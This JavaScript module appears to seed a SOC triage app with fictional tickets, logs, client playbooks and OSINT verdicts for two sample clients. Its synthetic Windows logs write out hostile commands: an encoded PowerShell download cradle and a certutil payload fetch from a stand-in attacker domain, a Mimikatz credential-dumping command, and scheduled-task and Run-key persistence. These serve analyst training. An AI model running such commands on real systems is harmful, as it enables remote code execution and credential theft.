import { analyze } from "./engine";

export const EMPTY_FORM = {
  client: "", ticketId: "", alertName: "", rawLogs: "", findings: "", analyst: "", shift: "Morning",
  verdict: "Auto", closure: "Auto", verdictReason: "", alertId: "", analyticsRule: "", ruleLogic: "",
  detectionSource: "", serviceSource: "", category: "", mitre: "", alertSeverity: "", status: "", classification: "",
  incidentCreated: "", activityWindow: "", asn: "", owner: "", location: "", ipType: "", reputation: "",
  logSource: "", edrTelemetry: "", defang: true,
};

const pad = (n) => String(n).padStart(2, "0");
function sampleALogs() {
  const lines = [];
  const acts = ["close", "accept", "client-rst", "close", "server-rst"];
  let sumS = 0, sumR = 0;
  for (let i = 0; i < 20; i++) {
    const src = i % 2 === 0 || i >= 18 ? "172.20.70.30" : "172.20.70.34";
    let s = 11000 + ((i * 977) % 2000), r = 140000 + ((i * 7919) % 20000);
    if (i === 19) { s = 254351 - sumS; r = 3172542 - sumR; }
    sumS += s; sumR += r;
    const sec = 14 * 60 + 7 + i * 113;
    const t = `09:${pad(Math.floor(sec / 60) % 60)}:${pad(sec % 60)}`;
    lines.push(`date=2026-06-02 time=${Math.floor(sec / 60) >= 60 ? t.replace(/^09/, "10") : t} devname="FGT-NW-HQ01" devid="FG100FTK21000001" tz="+0800" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=${src} srcport=${50112 + i * 7} srcintf="port2" dstip=101.72.194.189 dstport=443 dstintf="wan1" proto=6 action="${acts[i % 5]}" policyid=12 service="HTTPS" sentbyte=${s} rcvdbyte=${r} appcat="unscanned"`);
  }
  return lines.join("\n");
}
function enc16(s) { let b = ""; for (const ch of s) { const c = ch.charCodeAt(0); b += String.fromCharCode(c & 255, c >> 8); } return btoa(b); }
function sampleBLogs() {
  const L = [];
  for (let i = 0; i < 6; i++) L.push(`2026-06-02T05:0${2 + Math.floor(i / 3)}:${pad(11 + i * 9)}Z host=HL-WS-FIN07 EventID=4625 user=mreyes src_ip=203.0.113.47 LogonType=10 msg="An account failed to log on" FailureReason="Unknown user name or bad password"`);
  const b64 = enc16("IEX (New-Object Net.WebClient).DownloadString('http://dl.update-check.example/a.ps1')");
  L.push(
    `2026-06-02T05:05:40Z host=HL-WS-FIN07 EventID=4624 user=mreyes src_ip=203.0.113.47 LogonType=10 msg="An account was successfully logged on"`,
    `2026-06-02T05:07:02Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=explorer.exe process=powershell.exe cmd="powershell.exe -nop -w hidden -enc ${b64}"`,
    `2026-06-02T05:07:31Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=powershell.exe process=certutil.exe cmd="certutil.exe -urlcache -split -f http://dl.update-check.example/payload.bin C:\\Users\\Public\\svchelper.exe"`,
    `2026-06-02T05:08:12Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=svchelper.exe process=mimikatz.exe cmd="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" sha256=9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a`,
    `2026-06-02T05:08:13Z host=HL-WS-FIN07 Defender action=quarantined threat="HackTool:Win64/Mimikatz" file=C:\\Users\\Public\\mimikatz.exe sha256=9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a`,
    `2026-06-02T05:09:05Z host=HL-WS-FIN07 parent=svchelper.exe srcip=10.40.12.27 dstip=203.0.113.47 dstport=4444 proto=6 action=allowed msg="Outbound connection"`,
  );
  return L.join("\n");
}

export const SAMPLE_A = {
  ...EMPTY_FORM, client: "Northwind Logistics", ticketId: "INC-24131", alertName: "First-Seen External IP",
  rawLogs: sampleALogs(), analyst: "J. Navarro", shift: "Morning",
  findings: "MDE shows both hosts running the vendor update agent (nwupdate.exe) at the time of the connections.\nNo other hosts or users contacted the IP in the last 30 days.",
  verdict: "Likely False Positive", closure: "Closing as NFA",
  verdictReason: "Traffic matches the vendor update agent downloading packages from a CDN node",
  alertId: "a8f3c2d1-55e0-4b7a-9c1e-2f6d8b4e7a10", analyticsRule: "NW - First-Seen External IP Connection",
  ruleLogic: "Fires when an internal host connects to an external IP not seen in the previous 14 days.",
  detectionSource: "Microsoft Sentinel", serviceSource: "Scheduled analytics rule", category: "Command and Control",
  mitre: "T1071.001 – Application Layer Protocol: Web Protocols", alertSeverity: "Medium", status: "New", classification: "Undetermined",
  incidentCreated: "Jun 2, 2026 10:02 (UTC+08:00)", activityWindow: "Jun 2, 2026 09:00 – 10:00 (UTC+08:00)",
  asn: "AS64500", owner: "Example CDN Networks", location: "Singapore, SG", ipType: "Hosting / CDN IP, not residential",
  reputation: "AbuseIPDB 0% confidence and VirusTotal 0/94, no malicious reports", logSource: "Fortigate (CommonSecurityLog)",
  edrTelemetry: "nwupdate.exe (signed, Northwind IT) initiated the connections on both hosts",
};
export const SAMPLE_B = {
  ...EMPTY_FORM, client: "Harbor Lane Bank", ticketId: "INC-24127", alertName: "RDP Brute Force Followed by Credential Dumping",
  rawLogs: sampleBLogs(), analyst: "K. Santos", shift: "Morning",
  findings: "Six failed RDP logons from 203.0.113.47 followed by a successful logon for mreyes.\nEncoded PowerShell launched certutil to download svchelper.exe, which ran Mimikatz.\nDefender quarantined Mimikatz but svchelper.exe opened an outbound session on port 4444. Confirmed malicious.",
  verdict: "True Positive", closure: "Escalated to client",
  verdictReason: "Brute-forced RDP account was used to download tools and dump credentials",
  alertId: "5b1e9a77-0c3d-4f21-8e6b-91d4a2c7f3e5", analyticsRule: "HL - RDP Brute Force with Successful Logon",
  ruleLogic: "Fires on 5+ failed RDP logons followed by a success from the same source within 30 minutes.",
  detectionSource: "Microsoft Defender for Endpoint", serviceSource: "Microsoft Sentinel", category: "Credential Access",
  mitre: "T1110 – Brute Force", alertSeverity: "High", status: "Active", classification: "True positive",
  incidentCreated: "Jun 2, 2026 13:10 (UTC+08:00)", activityWindow: "Jun 2, 2026 13:02 – 13:09 (UTC+08:00)",
  asn: "AS64511", owner: "Example VPS Hosting", location: "Unknown", ipType: "VPS hosting IP", reputation: "AbuseIPDB 100% confidence, 312 reports for RDP brute force",
  logSource: "Windows Security, Defender for Endpoint", edrTelemetry: "Process tree confirms explorer.exe › powershell.exe › certutil.exe › svchelper.exe",
};
const EXTRA = [
  { form: { ...EMPTY_FORM, client: "Harbor Lane Bank", ticketId: "INC-24117", alertName: "Impossible Travel Sign-in", analyst: "K. Santos", verdict: "True Positive", closure: "Escalated to client",
    rawLogs: `2026-06-02T03:21:10Z user=rsantos@harborlane.example src_ip=198.51.100.23 msg="successful logon" location=Manila,PH\n2026-06-02T03:34:52Z user=rsantos@harborlane.example src_ip=192.0.2.88 msg="successful logon" location=Frankfurt,DE`,
    findings: "User denies the Frankfurt sign-in. Session token likely stolen." }, at: "2026-06-02T03:40:00Z", status: "Monitoring" },
  { form: { ...EMPTY_FORM, client: "Northwind Logistics", ticketId: "INC-24109", alertName: "Suspicious Scheduled Task Created", analyst: "J. Navarro",
    rawLogs: `2026-06-01T22:58:03Z host=NW-SRV-APP02 EventID=4698 user=svc_backup cmd="schtasks /create /tn Updater /tr C:\\ProgramData\\upd.exe /sc hourly"\n2026-06-01T22:58:41Z host=NW-SRV-APP02 EventID=4688 user=svc_backup cmd="reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\upd.exe"` }, at: "2026-06-01T23:05:00Z", status: "Awaiting client" },
  { form: { ...EMPTY_FORM, client: "Harbor Lane Bank", ticketId: "INC-24098", alertName: "Outbound Connection to Non-Standard Port", analyst: "L. Cruz", shift: "Night", verdict: "True Positive", closure: "Escalated to client",
    rawLogs: `2026-06-01T17:22:40Z host=HL-WS-OPS03 srcip=10.40.8.15 dstip=198.51.100.200 dstport=4444 proto=6 action=deny\n2026-06-01T17:22:55Z host=HL-WS-OPS03 srcip=10.40.8.15 dstip=198.51.100.200 dstport=4444 proto=6 action=deny`,
    findings: "Blocked at the firewall. Host reimaged by client IT." }, at: "2026-06-01T17:30:00Z", status: "Closed" },
];

export const snapshot = (form) => {
  const an = analyze(form);
  return { sev: an.severity, verdict: an.verdict, summary: an.summary, score: an.score, isFP: an.isFP,
    iocs: [...an.ips.external, ...an.domains, ...an.hashes.map((h) => h.value), ...an.hosts], rule: form.analyticsRule || form.alertName, primary: an.primaryIp || "" };
};

export function seedData() {
  const mk = (form, savedAt, extra = {}) => ({ id: form.ticketId, savedAt, form, escalatedAt: null, notableStatus: "Awaiting client", sample: true, ...snapshot(form), ...extra });
  const history = [
    mk(SAMPLE_A, "2026-06-02T02:20:00Z"),
    mk(SAMPLE_B, "2026-06-02T05:12:00Z", { escalatedAt: "2026-06-02T05:15:00Z" }),
    ...EXTRA.map((x) => mk(x.form, x.at, { escalatedAt: x.at, notableStatus: x.status })),
  ];
  const playbooks = {
    "Northwind Logistics": {
      name: "Northwind Logistics",
      matrix: [
        { sev: "Critical", contact: "Dana Whitfield (IT Security Lead)", email: "secops@northwind.example", channel: "Phone + email", sla: "15 min" },
        { sev: "High", contact: "Dana Whitfield (IT Security Lead)", email: "secops@northwind.example", channel: "Email + Teams", sla: "1 hour" },
        { sev: "Medium", contact: "IT Service Desk", email: "servicedesk@northwind.example", channel: "Email", sla: "4 hours" },
        { sev: "Low", contact: "IT Service Desk", email: "servicedesk@northwind.example", channel: "Daily summary email", sla: "24 hours" },
      ],
      containment: "SOC may isolate workstations via MDE without approval for Critical alerts. Servers and account disables need approval from Dana Whitfield.",
      procedures: [
        { title: "First-Seen External IP", steps: ["Check the destination owner, ASN and reputation in OSINT.", "Identify the process that made the connection in MDE.", "Check the Known benign list (vendor update CDNs are common).", "If the process is a signed, known agent and reputation is clean, close as NFA.", "Otherwise escalate as Medium and ask the client to confirm."] },
        { title: "Suspicious Scheduled Task", steps: ["Get the task XML and the action binary hash.", "Check whether the creating account is a known admin or service account.", "Escalate as Medium if the binary is unsigned or in ProgramData/Temp."] },
      ],
      contacts: [{ name: "Dana Whitfield", role: "IT Security Lead", email: "dana.whitfield@northwind.example", phone: "+63 2 8555 0101" }, { name: "IT Service Desk", role: "24/7 desk", email: "servicedesk@northwind.example", phone: "+63 2 8555 0199" }],
      benign: ["nwupdate.exe vendor agent connecting to Example CDN Networks (AS64500)", "Nightly Veeam backup traffic from 172.20.10.0/24 to 172.20.90.15", "Qualys scanner 172.20.5.40 port scans on Sundays 01:00–04:00"],
    },
    "Harbor Lane Bank": {
      name: "Harbor Lane Bank",
      matrix: [
        { sev: "Critical", contact: "Marco Ilagan (CISO)", email: "csirt@harborlane.example", channel: "Phone bridge + email", sla: "15 min" },
        { sev: "High", contact: "CSIRT on-call", email: "csirt@harborlane.example", channel: "Phone + email", sla: "30 min" },
        { sev: "Medium", contact: "CSIRT queue", email: "csirt@harborlane.example", channel: "Email", sla: "2 hours" },
        { sev: "Low", contact: "CSIRT queue", email: "csirt@harborlane.example", channel: "Weekly report", sla: "7 days" },
      ],
      containment: "SOC must not contain anything without CSIRT approval. Recommend actions only; the client executes containment.",
      procedures: [
        { title: "RDP Brute Force", steps: ["Confirm whether any logon succeeded after the failures.", "If yes, treat as Critical: call the CSIRT on-call before sending the email.", "Pull the process tree for the 30 minutes after the logon.", "List every external IP and hash for the client to block."] },
        { title: "Impossible Travel Sign-in", steps: ["Check both sign-in IPs and the device IDs.", "Ask the CSIRT to confirm travel with the user.", "Recommend session revocation and password reset if not confirmed."] },
      ],
      contacts: [{ name: "Marco Ilagan", role: "CISO", email: "marco.ilagan@harborlane.example", phone: "+63 2 8555 0201" }, { name: "CSIRT on-call", role: "24/7", email: "csirt@harborlane.example", phone: "+63 2 8555 0299" }],
      benign: ["Tenable scans from 10.40.1.50", "Branch VPN sign-ins from 198.51.100.0/24 (Harbor Lane ISP)"],
    },
  };
  const notes = {
    "INC-24131": [
      { id: "n1", type: "Investigation", time: "2026-06-02T02:08:00Z", text: "Reviewed 20 Fortigate traffic lines to 101.72.194.189:443. Two sources: 172.20.70.30 and 172.20.70.34.", author: "J. Navarro" },
      { id: "n2", type: "Assessment", time: "2026-06-02T02:18:00Z", text: "MDE ties the connections to nwupdate.exe. Owner Example CDN Networks matches the Known benign list.", author: "J. Navarro" },
    ],
    "INC-24127": [
      { id: "n3", type: "Investigation", time: "2026-06-02T05:11:00Z", text: "Brute force from 203.0.113.47 succeeded for mreyes. Encoded PowerShell and certutil download followed.", author: "K. Santos" },
      { id: "n4", type: "Client comms", time: "2026-06-02T05:15:00Z", text: "Called CSIRT on-call and sent the escalation email to csirt@harborlane.example.", author: "K. Santos" },
      { id: "n5", type: "Containment", time: "2026-06-02T05:22:00Z", text: "CSIRT isolated HL-WS-FIN07 and disabled mreyes.", author: "K. Santos" },
    ],
  };
  const osint = {
    "INC-24131": { values: { "101.72.194.189": { verdict: "Clean", note: "AbuseIPDB 0%, VT 0/94, CDN range" } }, extra: [] },
    "INC-24127": { values: {
      "203.0.113.47": { verdict: "Malicious", note: "AbuseIPDB 100%, 312 RDP brute-force reports" },
      "dl.update-check.example": { verdict: "Malicious", note: "Registered 3 days ago, VT 9/94" },
      "http://dl.update-check.example/payload.bin": { verdict: "Malicious", note: "URLhaus: malware download" },
      "9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a": { verdict: "Malicious", note: "VT 58/72 HackTool.Mimikatz" },
    }, extra: [] },
  };
  return { history, playbooks, notes, osint, currentId: "INC-24131" };
}
